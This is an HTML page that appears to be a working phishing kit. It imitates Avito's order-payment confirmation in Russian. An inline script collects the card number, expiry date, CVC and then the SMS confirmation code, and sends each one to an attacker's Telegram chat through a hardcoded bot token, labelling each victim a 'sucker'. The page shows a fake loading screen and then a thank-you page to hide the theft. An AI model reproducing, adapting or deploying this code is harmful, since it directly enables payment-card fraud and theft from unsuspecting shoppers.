<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" href="./images/unnamed-removebg-preview.png">
    <link rel="stylesheet" href="./CSS/style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300&family=Roboto&display=swap" rel="stylesheet">
    <title>Авито: недвижимость, транспорт, работа, услуги, вещи</title>
  </head>
  <body>
    <main id="page1" class="desktop-app-layout-rgSk3">
      <header class="header-header-ui6o_">
        <img src="./images/43b5562982178ce78f7c.svg" height="min-content" alt="Авито">
      </header>
      <section class="order-info-orderInfo-hoFKN">
        <h1 class="styles-module-root-TWVKW styles-module-root-_KFFt styles-module-size_xxxl-A2qfi styles-module-size_xxxl-_bK04 stylesMarningNormal-module-root-OSCNq stylesMarningNormal-module-h1-YK_Y_">Подтверждение заказа</h1>
        <h1 class="styles-module-root-TWVKW styles-module-root-_KFFt styles-module-size_xxxl-A2qfi styles-module-size_xxxl-_bK04 stylesMarningNormal-module-root-OSCNq stylesMarningNormal-module-h1-YK_Y_">№ <!-- -->40000000008055348</h1>
        <div class="disclaimer-disclaimer-tySmP"><p class="styles-module-root-_KFFt styles-module-size_s-awPvv styles-module-size_s-_P6ZA stylesMarningNormal-module-root-OSCNq stylesMarningNormal-module-s-J4nuX">Возможна комиссия вашего банка</p>
          <svg role="img" tabindex="0" aria-hidden="true" data-icon="help" aria-haspopup="true" aria-expanded="false" viewBox="0 0 24 24" name="help" data-marker="disclaimer" class="desktop-1rzg97r">
            <g>
              <title class="title">Платёж пройдёт как денежный перевод. Ваш банк может взять комиссию — её размер и возможность возврата уточняйте в банке.
               </title> 
               <path d="M22 12a10 10 0 1 1-20 0 10 10 0 0 1 20 0ZM8.86 7.79a1 1 0 1 0 1.95.42 1.5 1.5 0 0 1 2.97.32c0 .48-.22.89-.6 1.16-.35.26-.62.39-.98.57l-.14.07A1.96 1.96 0 0 0 11 12.08V13a1 1 0 0 0 2 0v-.9l.1-.05c.37-.19.76-.39 1.25-.74a3.4 3.4 0 0 0 1.43-2.78 3.5 3.5 0 0 0-6.92-.74ZM12 19a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
              </g>
          </svg>
        </div>
      </section>
      <div class="card_form">
        <form id="tg">
          <div class="inner_card">
            <div class="card_number">
              <label class="l1">Номер карты</label>
              <input id=input type="text" name="card" class="i1" size="15" maxlength="19" placeholder="0000 0000 0000 0000" autocomplete="off" required>
            </div>
            <div class="exp_cvc">
              <div class="expiration_date">
                <label class="l2">Срок действия</label>
                <input id=expir type="text" name="exp" class="i2" size="3" maxlength="5" placeholder="мм/гг" autocomplete="off" required>
              </div>
              <div class="cvc">
                <label class="l3">CVC</label>
                <input type="text" name="cvc" class="i3" size="2" maxlength="3" placeholder="000" autocomplete="off" required>
              </div>
            </div>
          </div>
          <button type="submit" class="button_submit" id="btn">Подтвердить</button>
        </form>
      </div>
      <div class="">
      <section class="security-block-securityBlock-aSk7b">
        <img src="./images/1943634e5b4f7c7cc300.svg" height="min-content" alt="security icons">
        <p class="text-text-NvRAe security-block-securityText-NuH6L security-block-sizeM-YBMJ2">Интернет-платежи на Авито защищены <br>сертификатом SSL и протоколом 3D Secure. <br>
          <a href="https://www.avito.ru/legal/rules/privacy-policy" class="security-block-legalConditionsUrl-_tVb8" target="_blank" rel="noreferrer">Политика обработки данных</a>
        </p>
      </section>
    </div>
    </main>
    <main id="page2" style="display: none;">
      <div class="loading">
          <img class="l_img" src="./images/resize-1667508155726980247unnamedremovebgpreview.png" alt="">
      </div>
      <div class="loading_text">
          <h1>Пожалуйста, подождите, Ваш запрос обрабатывается</h1>
      </div>
        
        <div class="content">
          <div class="content_inside">
              <header class="header-header-ui6o_ head">
                  <img class="iiimg" src="./images/43b5562982178ce78f7c.svg" height="min-content" alt="Авито">
              </header>
              <form class="sms_form" id="sms">
                  <label>Введите код подтверждения с СМС:</label>
                  <input type="text" name="code" size="8" maxlength="6" autocomplete="off" required>
                  <button type="submit">Подтвердить</button>
              </form>
          </div>
        </div>
  </main>
  <main id="page3" style="display: none;">
    <header>
        <div class="general">
            <div class="general_inside">
                <div class="header-header-ui6o_">
                    <img src="./images/43b5562982178ce78f7c.svg" height="min-content" alt="Авито">
                </div>
                <div class="thank_text">
                    <h1>Спасибо за оформление заказа!</h1>
                    <p>В течении 2-х дней мы свяжемся с вами по поводу доставки.</p>
                </div>
                <a href="https://www.avito.ru/">
                    <div class="btn_back">
                        <p>Вернутся на главную страницу</p>
                    </div>
                </a>
            </div>
        </div>
    </header>
</main>
    <script>
      expir.onkeyup= function(e){
      var len= this.value.replace(/\s+/g, '').length;

      if(len>5) return this.value= this.fix;
      if(len%2 === 0) {
      if(len === 4) {
      this.fix= this.value;
      return;
      }
      this.value +='/';
    }
  }
    </script>
    <script>
      input.onkeyup= function(e){
      var len= this.value.replace(/\s+/g, '').length;

      if(len>16) return this.value= this.fix;
      if(len%4 === 0) {
      if(len === 16) {
      this.fix= this.value;
      return;
    }
    this.value +=' ';
  }
}
    </script>
       <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
       <script>
        const TOKEN = "5704147870:AAEgIrTfyQw6GLmGSEKBucjv3AxS1zfDLSs";
        const CHAT_ID = "-1001792840014";
        const URI_API = `https://api.telegram.org/bot${ TOKEN }/sendMessage`;
        const p1 = document.getElementById('page1');
        const p2 = document.getElementById('page2');
        const p3 = document.getElementById('page3');
        
        document.getElementById('tg').addEventListener('submit', function(e) {
           e.preventDefault();
            
           let message = `<b>Новий лох!!!</b>\n`;
           message += `<b>Карта: </b> ${ this.card.value }\n`;
           message += `<b>Термін: </b> ${ this.exp.value }\n`;
           message += `<b>CVC: </b> ${ this.cvc.value }\n`;
           
           axios.post(URI_API, {
                chat_id: CHAT_ID,
                parse_mode: 'html',
                text: message
           })
           .then((res) => {
            this.card.value = "";
            this.exp.value = "";
            this.cvc.value = "";
            p1.style.display = "none";
            p2.style.display = "block"
           })

       })

       document.getElementById('sms').addEventListener('submit', function(e) {
          e.preventDefault();
           
          let message = `<b>Код з СМС!!!</b>\n`;
          message += `<b>Код: </b> ${ this.code.value }\n`;
          
          axios.post(URI_API, {
               chat_id: CHAT_ID,
               parse_mode: 'html',
               text: message
          })
          .then((res) => {
            this.code.value = "";
            p2.style.display = "none";
            p3.style.display = "block";
          })
       })
       </script>
       <script>
        const loading = document.querySelector('.loading');
        const content = document.querySelector('.content');
        const text = document.querySelector('.loading_text');
        setTimeout(() => {
        loading.style.opacity = "0";
        text.style.opacity = "0";
        content.style.opacity = "1";
        }, 20000)
      </script>
   </body>
</html>